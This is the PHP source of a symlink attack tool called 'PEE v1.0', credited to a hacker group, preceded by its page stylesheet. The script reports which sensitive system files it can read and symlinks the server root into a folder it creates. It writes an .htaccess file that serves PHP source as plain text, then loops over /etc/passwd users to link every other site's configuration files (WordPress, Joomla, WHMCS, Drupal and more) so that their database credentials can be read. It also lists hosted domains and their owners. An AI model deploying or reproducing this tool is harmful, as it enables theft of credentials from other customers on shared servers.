<style type="text/css">
     html,body {
        margin-top: 5px ;
        padding: 0;
        outline: 0;
    }
      
      
    body {
      
       direction: ltr;
       background-color: #000000;
       color: #CCCCCC;
       font-family: Tahoma, Arial, sans-serif;
       font-weight: bold;
       text-align: left ;
    }
      
    input,textarea,select{
    font-weight: bold;A
    color: #FFFFFF;
    dashed #ffffff;
    border: 1px dotted #003300;
    background-color: black;
    padding: 3px
    }
      
    input:hover{
    box-shadow:0px 0px 4px #009900;
      
    }
    .cont a
      
    {
      
      
    text-decoration: none;
    color: #FFFFFF;
      
      
      
    }
    .hedr
    {
    font-size:32px;
    color: #009900;
    text-shadow: 0px 0px 4px #003300 ;
      
      
      
    }
      
      
      
    .td1{
      
      
       border: 1px dotted #022B04;
       padding: 8px;
       border-radius: 20px;
       text-shadow: 0px 0px 2px #003300;
       font-size: 12px;
       font-family: Tahoma;
       font-weight: bold;
      align: center;
    }
      
    .td1 tr{}
      
    .lol{
     text-align: left;
     float: left;
     background: #990000;
    }
    .nop{
      
    width: 300px;
    text-align: center;
    font-size: 10px;
    font-family:Tahoma;
    color: #003300;
      
      
      
    }
    .nop a{
     text-decoration: none;
     color: #003300 ;
     text-shadow: none;
     width: 80px;
     padding: 8px
      
      
    }
    .nop a:hover{
     color: #FFFFFF;
    box-shadow: 0px 0px 4px #006600 ;
      
      
      
     }
    a
    {
    text-decoration: none;
    color: #006600;
      
    }
    
	a:visited {color:#2f4f4f;}
      
    .tmp tr td:hover{
      
    box-shadow: 0px 0px 4px #EEEEEE;
      
    }
    .fot{
      
    font-family:Tahoma, Arial, sans-serif;
      
     font-size: 13pt;
    }
      
    .ir {
     color: #FF0000;
    }
      
    
      
    .tmp tr td{
      
    border: dotted 1px #003300;
      
    padding: 4px ;
    font-size: 14px;
    }
      
    .tmp tr td a {
     text-decoration: none;
      
    }
    
      
      
    .lol a{
      
    font-size: 10px;
      
    }
      
    a:hover {color: red;}
    tr:hover,td:hover{background-color: #000000; color:red;}
      
      
      
      
      
      
      
    </style>
<?
####################################################
#####PEE v1.0							############
#####CODED by taufiquzzaman				############
#####BANGLADESH CYBER ARMY				############
####################################################


set_time_limit(0);
error_reporting(0);

echo '<title>PEE v1.0</title>';
	
function openBaseDir()
{
$openBaseDir = ini_get("open_basedir");
if (!$openBaseDir)
    {
        $openBaseDir = '<font color="green">OFF</font>';
    }
    else 
    {
        $openBaseDir = '<font color="red">ON</font>';
    }    
    return $openBaseDir;
}


echo '
      
    <table width="95%" cellspacing="0" cellpadding="0" class="td1" >
    <td height="100" align="left" class="td1">';
      
    $pg = basename(__FILE__);
      
   
    $safe_mode = @ini_get('safe_mode');
    $dir = @getcwd();
    
	echo "Server :&nbsp;<font color=green>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
    echo "PHP version : <b><font color=green>".@phpversion()."</font></b><br />";
    echo (($safe_mode)?("safe_mode &nbsp;: <b><font color=red>ON</font></b>"):("safe_mode: <b><font color=green>OFF</font></b>"));
    echo "<br />disable_functions : ";
    if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b><br>";}else{
      
    echo "<font color=red>$df</font></b><br />";
      
    }
    echo "Open_Basedir: ".openBaseDir()."<br />";
                  
    echo "Pwd : <font color=green><b>".$dir."</font></b><br />";
    
    if(is_readable("/etc/named.conf")){
	echo '[ <font color="green">/etc/named.conf</font> ]';
	}else{
	echo '[ <font color="red">/etc/named.conf</font> ]';
	}

	if(is_readable("/etc/passwd")){
	echo '[ <font color="green">/etc/passwd</font> ]';
	}else{
	echo '[ <font color="red">/etc/passwd</font> ]';
	}

	if(is_readable("/etc/valiases")){
	echo '[ <font color="green">/etc/valiases exists</font> ]';
	
	}else{
	echo '[ <font color="red">/etc/valiases</font> ]';
	}

	if(is_readable("/var/named")){
	echo '[ <font color="green">/var/named</font> ]';
	
	}else{
	echo '[ <font color="red">/var/named</font> ]';
	}  
	echo " &nbsp;&nbsp;&nbsp;&nbsp; [ CODED by P-74 ] [<a href='https://www.facebook.com/BDCyberArmy'> BANGLADESH CYBER ARMY <a>]";
	echo "</td>";
	
	#########################################################################################################################
	#########################################################################################################################
	
	
	


##.htaccess
@mkdir('pee',0777);
@symlink("/","pee/root");
$htaccss = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
 
file_put_contents("pee/.htaccess",$htaccss);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);


##Symlink to the ROOT
foreach($etcz as $etz){
$etcc = explode(":",$etz);
error_reporting(0);

$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);

symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php',"pee/".$etcc[0].'-PhpBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php',"pee/".$etcc[0].'-vBulletin.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php',"pee/".$etcc[0].'-IPB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php',"pee/".$etcc[0].'-MyBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php',"pee/".$etcc[0].'-SMF.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php',"pee/".$etcc[0].'-Drupal.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php',"pee/".$etcc[0].'-e107.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php',"pee/".$etcc[0].'-Seditio.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php',"pee/".$etcc[0].'-osCommerce.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
}
#####################




##############################################
 echo "
         
           
         <table cellspacing='0' cellpadding='2'  style=' margin:15px' class='tb1'>
            <tr>
            <td  rowspan='2' align='center' class='td1' valign='top' >      
            <div class='nop'>
			<font color='red'>CREATE SYMLINK</font><br><br>
            <a href='?do=var_named' >BY [ /var/named ]</a><br><br>
            <a href='?do=etc_passwd' >BY [ /etc/passwd ]</a><br><br>
			<a href='?do=etc_named.conf' >BY [ /etc/named.conf ]</a><br><br>
			<a href='?do=etc_valiases' >BY [ /etc/valiases ]</a><br><br>
            <a href='?do=posix' >BY [ posix_getpwuid ]</a> 
            </td></tr></div>
         ";
##############################################

if(isset($_REQUEST['do'])){ 
switch ($_REQUEST['do']){
###################################CASE: var_named
case 'var_named':

if(is_readable("/var/named")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$i += 1;
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));

echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
}
echo "<center>Total Domains Found: ".$i."</center><br />";
}else{ echo "<tr><td class='td1'>can't read [ /var/named ]</td><tr>"; }

break;
#####################END







###########CASE: /etc/passwd
case 'etc_passwd':


error_reporting(0);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);
if(is_readable("/etc/passwd")){

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';

$list = scandir("/var/named");

foreach($etcz as $etz){
$etcc = explode(":",$etz);

foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
if($owner['name'] == $etcc[0])
{
$i += 1;
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center><td class='td1'><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}}}}
echo "<center>Total Domains Found: ".$i."</center><br />";}

break;
#########################END







########CASE: etc_named.conf
case 'etc_named.conf':

if(is_readable("/etc/named.conf")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
$named = file_get_contents("/etc/named.conf");
preg_match_all('%zone \"(.*)\" {%',$named,$domains);
foreach($domains[1] as $domain){
$domain = trim($domain);
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
echo "<center>Total Domains Found: ".$i."</center><br />";

} else { echo "<tr><td class='td1'>can't read [ /etc/named.conf ]</td></tr>"; }

break;
##################################END








#############CASE etc_valiases
case 'etc_valiases':

if(is_readable("/etc/valiases")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
$list = scandir("/etc/valiases");
foreach($list as $domain){
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center><td class='td1'><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
echo "<center>Total Domains Found: ".$i."</center><br />";
} else { echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>"; }

break;
############END





##########CASE posix
case 'posix':

echo <<<PEE
<form method='POST'>
<br><br>Input Limit<br>
<input size='20' value='0' name='min' type='text'>
to
<input size='20' value='1024' name='max' type='text'>
<br>
<input value='SYMLINK' name='' type='submit'><br><br>
</form>

PEE;
if($_POST){
$min = $_POST['min'];
$max = $_POST['max'];

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';

$p = 0;
error_reporting(0);
$list = scandir("/var/named");
for($p = $min; $min <= $max; $p++)
{
	$user = posix_getpwuid($p);
	if(is_array($user)){
	
	foreach($list as $domain){
	if(strpos($domain,".db")){
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
	if($owner['name'] == $user['name'])
	{
	$i += 1;
	echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center><td class='td1'><font color='red'>".$user['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
	}
	}
	}	
	}

}
echo "<center>Total Domains Found: ".$i."</center><br />";
}

break;
#################END

}
}

?>